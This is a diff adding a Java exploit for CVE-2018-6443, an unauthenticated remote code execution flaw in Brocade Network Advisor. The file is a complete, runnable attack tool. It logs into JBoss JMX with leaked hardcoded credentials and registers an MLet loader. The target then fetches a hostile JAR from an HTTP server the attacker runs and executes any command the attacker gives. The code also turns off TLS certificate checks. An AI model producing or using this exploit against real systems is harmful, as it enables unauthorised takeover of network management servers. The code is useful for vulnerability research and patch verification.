@@ -1,0 +1,410 @@
+/*                                                                        
+   Exploit Title: Brocade Network Advisor - Unauthenticated Remote Code Execution
+   Date: 2017-03-29
+   Exploit Author: Jakub Palaczynski
+   Vendor Homepage: https://www.broadcom.com/
+   CVE: CVE-2018-6443
+
+   Version:
+      Tested on Brocade Network Advisor 14.X.X versions. Other may also be affected.
+      Tested on EMC Connectrix Manager Converged Network Edition 14.4.1. Other may also be affected.
+      IBM Network Advisor seems to also be affected.
+
+   Info: Exploit uses hardcoded and undocumented credentials for JBoss JMX to execute arbitrary command on system.
+*/
+
+import javax.management.remote.*;
+import javax.management.*;
+import java.util.*;
+import java.lang.*;
+import java.io.*;
+import java.net.*;
+import com.sun.net.httpserver.*;
+import java.util.Scanner;
+import java.security.*;
+import java.security.cert.*;
+import javax.net.ssl.*;
+import javax.net.ssl.HostnameVerifier;
+import javax.net.ssl.HttpsURLConnection;
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.SSLSession;
+import javax.net.ssl.TrustManager;
+import javax.net.ssl.X509TrustManager;
+import java.security.cert.X509Certificate;
+import java.util.regex.Pattern;
+import java.util.regex.Matcher;
+
+public class RemoteMbean {
+
+ private static String JARNAME = "compr.jar";
+ private static String OBJECTNAMEA = "BNASupport:name=support,id=3434";
+ private static String OBJECTNAMEB = "BNASecurity:name=loader,id=3535";
+ private static String EVILCLASS = "com.expl.Evil";
+
+ private static String localIP;
+ private static int localPort;
+ private static String connString;
+ private static String command;
+ private static String username;
+ private static String password;
+ private static String host;
+ private static int port;
+ private static int jmxport;
+ private static String tspwd;
+
+ public static void main(String[] args) {
+  try {
+   if (args.length < 3) {
+    showHelp();
+   }
+
+   tspwd = "changeit"; // default Java keystore password
+   host = args[0].split(":")[0]; // IP of BNA
+   port = Integer.parseInt(args[0].split(":")[1]); // HTTPS port of BNA
+
+   char SEP = File.separatorChar;
+   String path = System.getProperty("java.home") + SEP + "lib" + SEP + "security";
+   File dir = new File(path);
+   File file = new File(dir, "cacerts");
+   if (file.isFile() == false) {
+    file = new File(dir, "jssecacerts");
+    path = path + SEP + "jssecacerts";
+   } else {
+    path = path + SEP + "cacerts";
+   }
+
+   // import SSL certificate into Java keystore
+   checkCert(tspwd, file, path, host, port);
+
+   // check if hardcoded password is still there and find JMX port
+   jmxport = checkPwd(args[0]);
+
+   if (jmxport == 0) {
+    System.out.println("[-] Cannot find JMX port, trying default ...");
+    jmxport = 24604;
+   }
+
+   connString = "service:jmx:remote://" + host + ":" + jmxport + "/"; // connection string for JMX - if "Unsupported protocol" error then maybe should be changed to "remoting-jmx"
+   command = args[1]; // command to execute
+   localIP = args[2].split(":")[0]; // reverse IP address
+   localPort = Integer.parseInt(args[2].split(":")[1]); // reverse port
+   username = "admin"; // hardcoded username
+   password = "no12see!"; // hardcoded password
+
+   // starting HTTP server for serving mlet
+   System.out.println("[+] Starting HTTP server.");
+   HttpServer server = HttpServer.create(new InetSocketAddress(localPort), 0);
+   server.createContext("/mlet", new MLetHandler());
+   server.createContext("/" + JARNAME, new JarHandler());
+   server.setExecutor(null);
+   server.start();
+
+   // start exploitation
+   connectAndOwn(connString, command, username, password);
+   server.stop(0);
+
+   // clean up Java keystore
+   deleteCertificate(file, path, tspwd, host);
+
+  } catch (Exception e) {
+   e.printStackTrace();
+  }
+ }
+
+ static void showHelp() {
+  System.out.println("HOWTO: java -cp ./jboss-cli-client.jar:. RemoteMbean IP:BNA_HTTPS_PORT/ \"COMMAND\" REVERSEIP:REVERSEPORT");
+  System.out.println("Example: java -cp ./jboss-cli-client.jar:. RemoteMbean 127.0.0.1:443 \"id\" 127.0.0.1:1234");
+  System.exit(0);
+ }
+
+ static boolean checkCert(String tspwd, File file, String path, String host, int port) {
+  try {
+   InputStream in = new FileInputStream(file);
+   KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
+   ks.load( in , tspwd.toCharArray()); in .close();
+
+   SSLContext context = SSLContext.getInstance("TLS");
+   TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());
+   tmf.init(ks);
+   X509TrustManager defaultTrustManager = (X509TrustManager) tmf.getTrustManagers()[0];
+   SavingTrustManager tm = new SavingTrustManager(defaultTrustManager);
+   context.init(null, new TrustManager[] { tm }, null);
+   SSLSocketFactory factory = context.getSocketFactory();
+
+   System.out.println("[+] Checking certificate.");
+   SSLSocket socket = (SSLSocket) factory.createSocket(host, port);
+   socket.setSoTimeout(10000);
+   try {
+    socket.startHandshake();
+    socket.close();
+    System.out.println("[+] Certificate is already trusted.");
+    return true;
+   } catch (SSLException e) {
+    // e.printStackTrace(System.out); // uncomment to see what SSL error occured
+   }
+
+   X509Certificate[] chain = tm.chain;
+   if (chain == null) {
+    System.out.println("[-] Failed to obtain certificate. Connection to JMX server may fail.");
+    return false;
+   }
+
+   BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
+
+   MessageDigest sha1 = MessageDigest.getInstance("SHA1");
+   MessageDigest md5 = MessageDigest.getInstance("MD5");
+   for (int i = 0; i < chain.length; i++) {
+    X509Certificate cert = chain[i];
+    sha1.update(cert.getEncoded());
+    md5.update(cert.getEncoded());
+   }
+
+   X509Certificate cert = chain[0];
+   String alias = host;
+   ks.setCertificateEntry(alias, cert);
+
+   OutputStream out = new FileOutputStream(path);
+   ks.store(out, tspwd.toCharArray());
+   out.close();
+
+   System.out.println("[+] Added certificate to " + path + " using alias '" + alias + "'");
+
+  } catch (Exception e) {
+   e.printStackTrace();
+  }
+  return true;
+ }
+
+ static int checkPwd(String target) {
+  try {
+   TrustManager[] trustAllCerts = new TrustManager[] {
+    new X509TrustManager() {
+     public java.security.cert.X509Certificate[] getAcceptedIssuers() {
+      return null;
+     }
+     public void checkClientTrusted(X509Certificate[] certs, String authType) {}
+     public void checkServerTrusted(X509Certificate[] certs, String authType) {}
+    }
+   };
+
+   SSLContext sc = SSLContext.getInstance("SSL");
+   sc.init(null, trustAllCerts, new java.security.SecureRandom());
+   HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+
+   HostnameVerifier allHostsValid = new HostnameVerifier() {
+    public boolean verify(String hostname, SSLSession session) {
+     return true;
+    }
+   };
+
+   HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
+
+   // connect to BNA website
+   System.out.println("[+] Connecting to BNA website.");
+   URL url = new URL("https://" + target + "/dcm-client/dcmclient.jnlp");
+   HttpURLConnection con = (HttpURLConnection) url.openConnection();
+   con.setRequestMethod("GET");
+   BufferedReader in = new BufferedReader(
+    new InputStreamReader(con.getInputStream()));
+   String inputLine;
+   StringBuffer content = new StringBuffer();
+   while ((inputLine = in .readLine()) != null) {
+    content.append(inputLine);
+   } in .close();
+   con.disconnect();
+
+   // check for hardcoded password
+   if (!(content.indexOf("k62dCsMggeFy9oyf93Rujw==") >= 0)) {
+    System.out.println("[-] Cannot find hardcoded credentials.");
+    return 0;
+   }
+   else {
+    System.out.println("[+] Hardcoded credentials confirmed.");
+   }
+
+   // retrieve JMX port
+   Pattern p = Pattern.compile(Pattern.quote("jnlp.dcm.dcm.jmxport\"") + "(.*?)" + Pattern.quote(">"));
+   Matcher m = p.matcher(content);
+   while (m.find()) {
+    System.out.println("[+] Found JMX port: " + m.group(1).split("\"")[1] + ".");
+    return Integer.parseInt(m.group(1).split("\"")[1]);
+   }
+
+  } catch (Exception e) {
+   e.printStackTrace();
+   return 0;
+  }
+  return 0;
+ }
+
+
+ static void connectAndOwn(String connString, String command, String username, String password) {
+  JMXConnector c;
+
+  try {
+   JMXServiceURL u = new JMXServiceURL(connString);
+
+   // connect and authenticate
+   System.out.println("[+] Connecting using hardcoded credentials...");
+   Map env = new HashMap();
+   String[] creds = {
+    username,
+    password
+   };
+   env.put(JMXConnector.CREDENTIALS, creds);
+   c = JMXConnectorFactory.connect(u, env);
+   System.out.println("[+] Successfully connected.");
+
+   MBeanServerConnection m = c.getMBeanServerConnection();
+
+   // check if custom MBeans already exist
+   ObjectInstance evil_bean = null;
+   try {
+    evil_bean = m.getObjectInstance(new ObjectName(OBJECTNAMEA));
+   } catch (Exception e) {
+    evil_bean = null;
+   }
+
+   if (evil_bean == null) {
+    ObjectInstance oi = null;
+    ObjectName mletObjName = new ObjectName(OBJECTNAMEA);
+    ObjectName mletLoaderName = new ObjectName(OBJECTNAMEB);
+
+    System.out.println("[+] Registering MLet class.");
+    try {
+     oi = m.createMBean("javax.management.loading.MLet", mletLoaderName);
+    } catch (javax.management.InstanceAlreadyExistsException e) {
+     oi = m.getObjectInstance(new ObjectName(OBJECTNAMEB));
+    }
+
+    System.out.println("[+] MLet class successfully registered.");
+    System.out.println("[+] Downloading and registering custom class.");
+    Object res = m.invoke(oi.getObjectName(), "getMBeansFromURL", new Object[] {
+     String.format("http://%s:%d/mlet/", localIP, localPort)
+    }, new String[] {
+     String.class.getName()
+    });
+    HashSet res_set = ((HashSet) res);
+    Iterator itr = res_set.iterator();
+    Object nextObject = itr.next();
+    if (nextObject instanceof Exception) {
+     throw ((Exception) nextObject);
+    }
+    evil_bean = ((ObjectInstance) nextObject);
+   }
+   System.out.println("[+] Custom class successfully registered.");
+   System.out.println("[+] Running command.\n");
+   ObjectName plok = new ObjectName(OBJECTNAMEA);
+   Object result = m.invoke(evil_bean.getObjectName(), "runCommand", new Object[] {
+    command
+   }, new String[] {
+    String.class.getName()
+   });
+   System.out.println("Result:\n" + result + "\n");
+
+   // unregister custom MBeans
+   System.out.println("[+] Cleaning up JMX.");
+   for (ObjectInstance x: m.queryMBeans(null, null)) {
+    if (x.getObjectName().toString().startsWith("BNASecurity")) {
+     m.unregisterMBean(x.getObjectName());
+    }
+   }
+
+   for (ObjectInstance x: m.queryMBeans(null, null)) {
+    if (x.getObjectName().toString().startsWith("BNASupport")) {
+     m.unregisterMBean(x.getObjectName());
+    }
+   }
+  } catch (Exception e) {
+   e.printStackTrace();
+  }
+ }
+
+ static class MLetHandler implements HttpHandler {
+  public void handle(HttpExchange t) throws IOException {
+   String response = String.format("<HTML><MLET CODE=%s ARCHIVE=%s NAME=%s CODEBASE=http://%s:%d/></MLET></HTML>", EVILCLASS, JARNAME, OBJECTNAMEA, localIP, localPort);
+   System.out.println("[+] Received reverse connection for HTTP page.");
+   t.sendResponseHeaders(200, response.length());
+   OutputStream os = t.getResponseBody();
+   os.write(response.getBytes());
+   os.close();
+  }
+ }
+
+ static class JarHandler implements HttpHandler {
+  public void handle(HttpExchange t) throws IOException {
+   System.out.println("[+] Received reverse connection for JAR file.");
+   File file = new File(JARNAME);
+   byte[] bytearray = new byte[(int) file.length()];
+   FileInputStream fis = new FileInputStream(file);
+   BufferedInputStream bis = new BufferedInputStream(fis);
+   bis.read(bytearray, 0, bytearray.length);
+   t.sendResponseHeaders(200, file.length());
+   OutputStream os = t.getResponseBody();
+   os.write(bytearray, 0, bytearray.length);
+   os.close();
+  }
+ }
+
+ private static final char[] HEXDIGITS = "0123456789abcdef".toCharArray();
+
+ private static String toHexString(byte[] bytes) {
+  StringBuilder sb = new StringBuilder(bytes.length * 3);
+  for (int b: bytes) {
+   b &= 0xff;
+   sb.append(HEXDIGITS[b >> 4]);
+   sb.append(HEXDIGITS[b & 15]);
+   sb.append(' ');
+  }
+  return sb.toString();
+ }
+
+ public static void deleteCertificate(File trustStore, String path, String password, String alias) {
+  try (final FileInputStream fis = new FileInputStream(trustStore)) {
+   final KeyStore keystore = KeyStore.getInstance(KeyStore.getDefaultType());
+   keystore.load(fis, password.toCharArray());
+   if (keystore.containsAlias(alias)) {
+    keystore.deleteEntry(alias);
+    OutputStream writeStream = new FileOutputStream(path);
+    keystore.store(writeStream, password.toCharArray());
+    writeStream.close();
+    System.out.println("[+] Certificate deleted from keystore.");
+   }
+   else {
+    System.out.println("[-] Alias " + alias + " not found in keystore.");
+   }
+  }
+  catch (final Exception e) {
+   System.out.println("[-] Error occured while deleting certificate.");
+  }
+ }
+
+ private static class SavingTrustManager implements X509TrustManager {
+  private final X509TrustManager tm;
+  private X509Certificate[] chain;
+  SavingTrustManager(X509TrustManager tm) {
+   this.tm = tm;
+  }
+
+  @Override
+  public X509Certificate[] getAcceptedIssuers() {
+   return new X509Certificate[0];
+   // throw new UnsupportedOperationException();
+  }
+
+  @Override
+  public void checkClientTrusted(final X509Certificate[] chain,
+   final String authType)
+  throws CertificateException {
+   throw new UnsupportedOperationException();
+  }
+
+  @Override
+  public void checkServerTrusted(final X509Certificate[] chain,
+   final String authType)
+  throws CertificateException {
+   this.chain = chain;
+   this.tm.checkServerTrusted(chain, authType);
+  }
+ }
+}
